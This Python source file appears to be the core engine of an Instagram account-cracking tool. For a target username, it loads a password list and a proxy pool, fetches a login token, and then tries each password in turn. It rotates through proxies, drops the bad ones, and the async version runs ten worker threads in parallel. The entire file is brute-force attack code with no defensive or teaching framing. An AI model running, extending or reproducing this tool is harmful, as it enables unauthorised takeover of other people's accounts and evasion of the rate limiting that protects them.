from __future__ import absolute_import

import logging
import sys

import asyncio
import concurrent.futures
import queue

from app import settings

from app.lib import exceptions
from app.lib.sessions import InstagramSession
from app.lib.users import User

from app.queues import QueueManagerSync, QueueManagerAsync


__all__ = ('EngineSync', 'EngineAsync', )


class EngineSync(object):

    __queue_manager__ = QueueManagerSync

    def __init__(self, username):
        self.user = User(username)
        self.queues = self.__queue_manager__(user=self.user)

        self._configure_logger()
        self.log = logging.getLogger('Instagram Engine')

    def run(self):
        token = self._prepare()
        self._attack(token)

    def _configure_logger(self):
        logging.basicConfig(
            level=logging.INFO,
            stream=sys.stderr,
        )

    def _handle_login_api_error(self, e, log, proxy):
        if isinstance(e, exceptions.ApiBadProxyException):
            log.info(f'Found Bad Proxy {proxy.ip}')
        elif isinstance(e, exceptions.ApiClientException):
            if e.error_type == settings.GENERIC_REQUEST_ERROR:
                log.info(f'Found Bad Proxy w Generic Request Error {proxy.ip}')
            else:
                raise e

    def _prepare(self):
        self.queues.populate_passwords()
        self.queues.populate_proxies()

        token = self._get_token()
        return token

    def _attack(self, token):
        log = logging.getLogger("Attack")
        log.info("Starting Attack")
        while not self.queues.passwords.empty():
            password = self.queues.passwords.get()
            self._login(password, token)

    def _login_with_proxy(self, password, token, proxy):
        log = logging.getLogger('Login')

        log.info(f'Attempting to Login Password: {password} Proxy: {proxy.ip}')
        session = InstagramSession(self.user, proxy=proxy)
        try:
            results = session.login(password, token)
        except exceptions.ApiException as e:
            self._handle_login_api_error(e, log, proxy)
            return None
        else:
            self.queues.proxies.put_nowait(proxy)
            print(f"Got Results for {password}: {results}")
            return results

    def _get_token_for_proxy(self, proxy):
        log = logging.getLogger('Searching for a Token')
        log.info(f'Attempting Token Fetch with {proxy.ip}')
        session = InstagramSession(self.user, proxy=proxy)
        try:
            token = session.get_token()
        except exceptions.ApiBadProxyException:
            log.info(f'Found Bad Proxy {proxy.ip}')
        else:
            self.queues.proxies.put_nowait(proxy)
            return token

    def _login(self, password, token):
        while True:
            try:
                proxy = self.queues.proxies.get()
            except queue.Empty:
                continue
            else:
                results = self._login_with_proxy(password, token, proxy)
                if results:
                    return results

    def _get_token(self):
        while not self.queues.proxies.empty():
            try:
                proxy = self.queues.proxies.get()
            except queue.Empty:
                continue
            else:
                results = self._get_token_for_proxy(proxy)
                if results:
                    return results


class EngineAsync(EngineSync):

    __queue_manager__ = QueueManagerAsync

    def __init__(self, username, event_loop):
        super(EngineAsync, self).__init__(username)
        self.event_loop = event_loop

    def _configure_logger(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(threadName)5s - %(name)5s: %(message)s',
            stream=sys.stderr,
        )

    def _create_login_tasks(self, executor, loop, stop_event, token):
        self.log.info("Queueing Up Login Tasks")
        tasks = []
        while not self.queues.passwords.empty():
            password = self.queues.passwords.get_nowait()
            task = loop.run_in_executor(executor, self._login, password, token, stop_event)
            tasks.append(task)
        return tasks

    def run(self):
        asyncio.run(self._prepare())
        token = self.queues.tokens.get_nowait()

        try:
            self.event_loop.run_until_complete(self._attack_asynchronously(token))
        finally:
            self.event_loop.close()

    async def _cancel_running_tasks(self, tasks):
        for task in tasks:
            task.cancel()

    async def _prepare(self):

        await self.queues.populate_passwords()
        await self.queues.populate_proxies()

        token = await self._get_token_asynchronously()
        self.queues.tokens.put_nowait(token)

    async def _attack_asynchronously(self, token):
        log = logging.getLogger("Attack")
        log.info("Starting Attack")

        # Try with and without creating a new loop inside
        loop = asyncio.get_event_loop()

        stop_event = asyncio.Event()

        executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
        tasks = self._create_login_tasks(executor, loop, stop_event, token)

        await asyncio.gather(*tasks)

    async def _get_token_asynchronously(self):

        # Try with and without creating a new loop inside
        loop = asyncio.get_event_loop()
        event = asyncio.Event()
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)

        # There is a chance that we do not get a token in any of the first 10 tasks,
        # but we will worry about that later.
        tasks = [
            loop.run_in_executor(executor, self._get_token, event)
            for i in range(10)
        ]

        completed, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)

        event.set()
        result = completed.pop()
        self.queues.tokens.put_nowait(result.result())

        await loop.shutdown_asyncgens()
        await self._cancel_running_tasks(pending)

        return result.result()

    def _login(self, password, token, stop_event):
        while not stop_event.is_set():
            try:
                proxy = self.queues.proxies.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                results = self._login_with_proxy(password, token, proxy)
                if results:
                    return results

    def _get_token(self, event):
        while not event.is_set() and not self.queues.proxies.empty():
            try:
                proxy = self.queues.proxies.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                token = self._get_token_for_proxy(proxy)
                if token:
                    return token
